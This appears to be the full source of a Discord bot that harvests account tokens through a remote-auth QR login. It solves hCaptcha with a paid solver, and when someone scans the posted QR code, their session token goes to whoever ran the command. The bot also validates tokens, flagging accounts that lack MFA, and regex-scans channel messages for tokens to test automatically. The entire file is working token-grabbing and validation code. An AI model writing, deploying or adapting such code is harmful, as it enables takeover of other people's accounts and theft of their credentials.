from colorama import Fore, init; init(autoreset=True)
import asyncio, os, discord, json
from remoteauthclient import RemoteAuthClient
from discord.ext import tasks
from discord.ext.commands import Bot
from capmonster_python import HCaptchaTask
from requests import get
import re
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX


#Get the headers
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
        command = 'cls'
    os.system(command)

with open('config.json') as f:
    config = json.load(f)

botToken = config.get('botToken')
prefix = config.get('prefix')
command_name = config.get('command_name')

def startprint():
    print(f"{y}[{Fore.GREEN}!{y}]{w} Bot Online!")


bot = Bot(command_prefix=prefix)

#Launching the Bot
def Init():
    botToken = config.get('botToken')
    prefix = config.get('prefix')
    bot.run(botToken)

#Event initialization
@bot.event
async def on_ready():
    clearConsole()
    startprint()

#Bot command
@bot.slash_command(name='get_token', description="Get your token through a QR code!", guild_ids=[config.get('guild_id')])
async def gettoken(interaction: discord.ApplicationContext):
    c = RemoteAuthClient()

    @c.event("on_fingerprint")
    async def on_fingerprint(data):
        embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
        await interaction.edit(embed=embed_qr)

    @c.event("on_cancel")
    async def on_cancel():
        await interaction.edit(content="Auth cancelled", embed=None)

    @c.event("on_timeout")
    async def on_timeout():
        await interaction.edit(content="Timed out", embed=None)

    @c.event("on_captcha")
    async def on_captcha(captcha_data):
        embed_qr = discord.Embed(title="Solving captcha, please wait...", color=5003474)
        await interaction.edit(embed=embed_qr)
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        capmonster = HCaptchaTask(config.get('capmonster_api_key'))
        capmonster.set_user_agent(user_agent)
        task_id = capmonster.create_task(website_url="https://discord.com/channels/@me", website_key=captcha_data.get('captcha_sitekey'), is_invisible=True, custom_data=captcha_data.get("captcha_rqdata"))
        result = capmonster.join_task_result(task_id)
        return result.get("gRecaptchaResponse")
        
    @c.event("on_token")
    async def on_token(token):
        await interaction.edit(content=token, embed=None)
                    
    #Embed Creation
    asyncio.create_task(c.run())
    embed_qr = discord.Embed(description="\n1️⃣ Open the Discord Mobile application\n2️⃣ Go to settings\n3️⃣ Choose the \"Scan QR Code\" option \n4️⃣ Scan the QR code below", color=5003474)
    await interaction.response.send_message(embed=embed_qr, ephemeral=True)

@bot.slash_command(name='check', description="Check a token!", guild_ids=[config.get('guild_id')])
async def check(interaction: discord.ApplicationContext, token: discord.Option(str, "token", required=True)):
    try:
        res = get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
        if res.status_code == 200:
            res_json = res.json()
            def check(thing):
                if thing == True:
                    return "✅"
                else:
                    return "❌"
            color = discord.Colour.green() if check(res_json['mfa_enabled']) == "❌" and check(res_json['verified']) == "✅" else discord.Colour.red()
            embed = discord.Embed(title="Token is working!", color=color, description=f"Username: {res_json['username']}#{res_json['discriminator']}\nMFA enabled: {check(res_json['mfa_enabled'])}\nPhone verified: {check(res_json['verified'])}")
            if "Owner" in str(interaction.author.roles):
                await interaction.response.send_message(embed=embed)
            else:
                await interaction.response.send_message(embed=embed,  ephemeral=True)
        else:
            not_working = discord.Embed(title="Token is not working.", color=discord.Colour.red())
            if "Owner" in str(interaction.author.roles):
                await interaction.response.send_message(embed=not_working)
            else:
                await interaction.response.send_message(embed=not_working,  ephemeral=True)
    except:
        error = discord.Embed(title="An error occurred.", color=discord.Colour.red())
        if "Owner" in str(interaction.author.roles):
            await interaction.response.send_message(embed=error)
        else:
            await interaction.response.send_message(embed=error,  ephemeral=True)

@bot.event
async def on_message(message):
    if config.get("auto_token_check").lower() == "true":
        try:
            findtoken = re.findall("[\w-]{24}\.[\w-]{6}\.[\w-]{38}",str(message.content))
            if findtoken:
                try:
                    for token in findtoken:
                        res = get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
                        if res.status_code == 200:
                            await message.add_reaction("✅")
                            if config.get("check_phone_and_mfa").lower() == "true":
                                if res.json()['verified'] == False:
                                    await message.add_reaction("📵")
                                if res.json()['mfa_enabled'] == True:
                                    await message.add_reaction("🔒")
                        else:
                            await message.add_reaction("❌")

                except:
                    await message.add_reaction("❓")
        except:
            pass

#Start Everything
if __name__ == '__main__':
    Init()